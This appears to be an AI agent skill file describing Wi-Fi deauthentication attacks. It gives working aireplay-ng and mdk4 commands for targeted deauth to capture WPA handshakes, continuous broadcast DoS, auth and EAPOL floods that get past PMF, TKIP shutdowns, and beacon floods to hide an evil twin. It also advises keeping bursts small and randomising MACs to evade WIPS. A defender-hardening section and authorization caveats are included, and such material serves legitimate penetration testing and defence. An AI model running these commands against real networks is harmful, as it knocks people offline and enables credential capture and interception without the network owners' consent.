---
name: offensive-deauth-disassoc
description: "Deauthentication and disassociation attacks against 802.11 networks — targeted single-client deauth for handshake capture, broadcast deauth for DoS (with authorization), action-frame attacks bypassing 802.11w (PMF), beacon flooding, mdk4 / aireplay-ng tooling, and rate-limit / PMF-aware operation. Use to coerce client reconnection (handshake capture, evil-twin roaming), as targeted DoS, or to test PMF posture."
---

# Deauth / Disassoc Attacks

The most-used 802.11 management-frame attack: send a forged deauthentication or disassociation frame as the AP, and the client disconnects. Modern PMF (802.11w) authenticates these frames cryptographically — but most consumer and many enterprise deployments still don't require PMF.

## Quick Workflow

1. Identify target client + AP (BSSID, channel)
2. Pick deauth scope: single client (quiet) vs. broadcast (loud, DoS)
3. Verify PMF status — if required, classic deauth fails; pivot to action-frame attacks
4. Send the deauth burst at the right rate

---

## Single-Client Deauth (Preferred)

Used to force handshake capture, push client to evil twin, or test reconnection behavior.

```bash
sudo aireplay-ng --deauth 5 \
  -a AA:BB:CC:DD:EE:FF \    # AP BSSID
  -c 11:22:33:44:55:66 \    # client MAC
  wlan0mon
```

- `--deauth 5` sends 5 deauths (10 frames — 5 to AP, 5 to client). 3–10 is usually enough.
- More than 30 in a burst is unnecessarily noisy.

## Broadcast Deauth (DoS, Use Sparingly)

```bash
# Single AP, all clients
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon
# --deauth 0 = continuous

# Multiple APs across channels (mode d = deauth/disassoc amok).
# Flag for a MAC filter file is version-dependent: -w (whitelist) / -b (blacklist).
# Confirm with `mdk4 --help d` before use; -c takes the channel hop list.
sudo mdk4 wlan0mon d -b target_macs.txt -c 1,6,11
```

Only with explicit authorization. Continuous broadcast deauth is a clear DoS signal and trips most WIPS within seconds.

## PMF (802.11w) Awareness

PMF authenticates deauth/disassoc frames. Status visible in beacon RSN capabilities:

```bash
sudo airodump-ng wlan0mon -c <ch> --bssid <BSSID>
# PMF column: Required / Capable / Off
```

| PMF Status | Deauth Effect |
|---|---|
| Off | Classic deauth works |
| Capable (optional) | Works against clients without PMF, fails against PMF-enabled clients |
| Required | Classic deauth ignored — must use action-frame attacks |

## Action-Frame Attacks Against PMF

PMF protects deauth/disassoc but doesn't always protect all action frames. Specific action types remain exploitable:

PMF protects deauth/disassoc, but other mdk4 modes still cause disconnects without spoofing a protected management frame. Verify mode letters against `mdk4 --help <mode>` on your installed version — they have been mislabeled in many copied cheatsheets.

```bash
# mode a — authentication DoS: floods the AP with auth frames, exhausting its
# client/association table so legitimate clients can't connect. Works regardless of PMF.
sudo mdk4 wlan0mon a -a <BSSID>

# mode e — EAPOL start/logoff flood: can kick clients off; not a spoofed deauth frame.
sudo mdk4 wlan0mon e -t <BSSID>

# mode m — Michael (TKIP) countermeasures: forces a ~60s AP shutdown.
# ONLY applies to legacy TKIP networks, not CCMP/WPA2-AES or WPA3.
sudo mdk4 wlan0mon m -t <BSSID>
```

> Correction vs. common cheatsheets: mdk4 mode `m` is **Michael/TKIP countermeasures**, not a "CTS/virtual-carrier" attack, and mode `w` is **WIDS confusion**, not an "SAE/WPA-Enterprise flood" (SAE is WPA3). Don't rely on those mislabeled one-liners.

Separately, the IEEE 802.11 spec marks some action frames (certain block-ack and channel-switch announcements) as "may be unprotected" — implementation-specific paths exist but require chipset-specific testing.

## Beacon Flooding

Confuse clients (and WIPS) by flooding fake beacons:

```bash
sudo mdk4 wlan0mon b -f beacon_essids.txt -c 6 -s 100
# Floods 100 beacons/sec for ESSIDs in the file
```

Use cases:
- Hide your evil twin among noise
- Stress-test client roaming logic
- DoS WIPS dashboards (flood with thousands of fake APs)

## Rate Tuning and Detection

| Burst | Defender Signal |
|---|---|
| 3–10 deauth, single client | Often misclassified as roaming or RF noise |
| >30 deauth/sec from one source | WIPS rule trips |
| Continuous broadcast deauth | Clear DoS — alert + ticket within minutes |
| Beacon flood >50/sec | Saturates WIPS dashboards |

Randomize source MAC across burst-and-pause cycles to spread the signal.

## Mitigations / Defender Hardening

This is the counter. Deauth/disassoc abuse is a *solved* problem at the protocol level — the gap is deployment, not defense:

| Technique | Mitigation |
|---|---|
| Classic deauth/disassoc spoofing | **Set PMF (802.11w) to Required**, not just Capable. Required cryptographically authenticates management frames and makes classic deauth inert |
| PMF left Capable/optional | Audit every SSID; Capable still lets non-PMF clients be deauthed. Move to Required once the client fleet supports it |
| Legacy clients blocking PMF-Required | Segment legacy devices onto a separate SSID/VLAN so the main network can enforce Required |
| Protocol gap entirely | **Deploy WPA3** — PMF is mandatory in WPA3, closing the deauth vector by default |
| Action-frame / auth-flood attacks | Enable WIPS containment + rate-limit auth/assoc; patch AP firmware for known management-frame floods |
| Beacon flood hiding an evil twin | WIPS rogue-AP detection tuned to alert (not just dashboard); 802.11r/k/v for sane roaming so a rogue SSID is less attractive |

Defender one-liner: **PMF-Required (or WPA3) + a tuned WIPS** removes the classic deauth vector outright and turns the remaining action-frame paths into loud, chipset-specific noise.

Verification step a blue team can run: confirm the RSN capabilities bit advertises **MFPR (Management Frame Protection Required)**, not just MFPC (Capable), in the beacon of every production SSID.

## Engagement Cheatsheet

```bash
# 1. Recon — note PMF status per target
sudo airodump-ng wlan0mon -c <ch> --bssid <BSSID>

# 2. Single-client deauth for handshake capture
sudo aireplay-ng --deauth 3 -a <BSSID> -c <client> wlan0mon

# 3. PMF blocking? Try action-frame attacks
sudo mdk4 wlan0mon a -a <BSSID>

# 4. DoS scenario (authorized)
sudo aireplay-ng --deauth 0 -a <BSSID> wlan0mon
```

## Reporting

Document for each test:

- Target BSSID + ESSID + PMF status
- Burst size, duration
- Effect observed (client reconnected? handshake captured? DoS achieved?)
- Detection signals defender would have seen

---

## MITRE ATT&CK Mapping

| Technique | ID | Where it appears here |
|---|---|---|
| Network Denial of Service | T1498 | Broadcast / continuous deauth; auth and beacon floods |
| Adversary-in-the-Middle | T1557 | Deauth to drive clients onto an evil twin |
| Network Sniffing | T1040 | Forcing reconnection to capture the WPA handshake |

## Key References

- aireplay-ng documentation: https://www.aircrack-ng.org/doku.php?id=aireplay-ng
- mdk4: https://github.com/aircrack-ng/mdk4
- IEEE 802.11w-2009 — Protected Management Frames (now folded into IEEE 802.11-2020)
- Wi-Fi Alliance — WPA3 specification (PMF mandatory): https://www.wi-fi.org/discover-wi-fi/security
- "Why MAC Address Randomization Doesn't Work" — research on action-frame / probe leakage
- MITRE ATT&CK: https://attack.mitre.org/techniques/T1498/
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/wireless.md
